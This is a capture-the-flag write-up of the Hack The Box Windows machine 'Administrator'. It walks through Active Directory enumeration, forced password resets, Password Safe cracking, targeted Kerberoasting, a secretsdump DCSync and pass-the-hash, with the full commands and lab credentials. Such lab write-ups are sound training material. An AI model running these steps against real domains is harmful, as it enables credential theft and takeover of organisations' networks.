---
title: "Administrator - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - medium
  - windows
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Administrator
![](https://kar0nx.github.io/assets/images/writeup/9d232b1558b7543c7cb85f2774687363.png)
## Reconnaissance

IP: 10.10.11.42
Username: Olivia Password: ichliebedich
## NMAP

```
nmap -T4 -p- -A 10.10.11.42
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 03:24 EDT
Nmap scan report for 10.10.11.42
Host is up (0.030s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-27 14:25:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
59737/tcp open  msrpc         Microsoft Windows RPC
62724/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62729/tcp open  msrpc         Microsoft Windows RPC
62736/tcp open  msrpc         Microsoft Windows RPC
62741/tcp open  msrpc         Microsoft Windows RPC
62754/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/27%OT=21%CT=1%CU=40667%PV=Y%DS=2%DC=T%G=Y%TM=68AEB31
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=
OS:A)SEQ(SP=105%GCD=2%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR
OS:=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=F2%GCD=1%ISR=100%TI=I%CI=I%II=I%SS=
OS:S%TS=A)SEQ(SP=FD%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=A)OPS(O1=M552NW8ST
OS:11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552S
OS:T11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=8
OS:0%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(
OS:R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-27T14:26:07
|_  start_date: N/A
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   30.18 ms 10.10.14.1
2   30.64 ms 10.10.11.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.83 seconds
```

AD set, so starting with NXC

## SMB

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827092547.png)

I collected users and save in users.txt

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827092822.png)

nothing special after connecting with winrm so lets enumerate via bloodhound

```
bloodhound-python -d administrator.htb -u olivia -p ichliebedich -ns 10.10.11.42 -c all --zip
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827095052.png)

## Gaining Access

In bloodhound I found that olivia have GenericAll rights over michael

```
net rpc password "michael" "Password1" -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827095413.png)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827095833.png)

Next I found that michael have ForceChangePassword rights over benjamin

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827095904.png)

same as before
```
net rpc password "benjamin" "Password1" -U "administrator.htb"/"michael"%"Password1" -S "10.10.11.42"
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827100043.png)

Benjamin is Share Moderator, starting with enumerating smb, but there is nothing to look for, next enumerating ftp i found interesting backup file

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827100228.png)

which I was able to crack via pwsafa2john

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827100706.png)

searching google for program to open psafe3, I found https://github.com/pwsafe/pwsafe/blob/1.21.0/README.LINUX.md

```
sudo apt install passwordsafe
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827101717.png)

selecting file and entering master password gave us access to saved credentials

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827101852.png)

```
alexander UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

only emily creds was correct 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827103811.png)

## Privilege Escalation

Enumerating bloodhound I spot that emily have GenericWrite to ethan


![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827104003.png)

So Targeted Kerberoast attack with targetedKerberoast.py

```
ntpdate 10.10.11.42

python3 targetedKerberoast.py -v -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --dc-ip 10.10.11.42
```

simply copy and paste from bloodhound (remember to sync time with DC)

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827114956.png)

Cracking obtained ethan hash with hashcat

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827115117.png)

And we have next user and password

```
ethan limpbizkit
```

Checking ethan in bloodhound I spot that He have GetChanges to Administrator

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827115326.png)

So now we can dump SAM database form dc

```
impacket-secretsdump administrator.htb/ethan:limpbizkit@10.10.11.42
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827115350.png)

For the last step we use pass the hash with administrator account 

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250827115442.png)
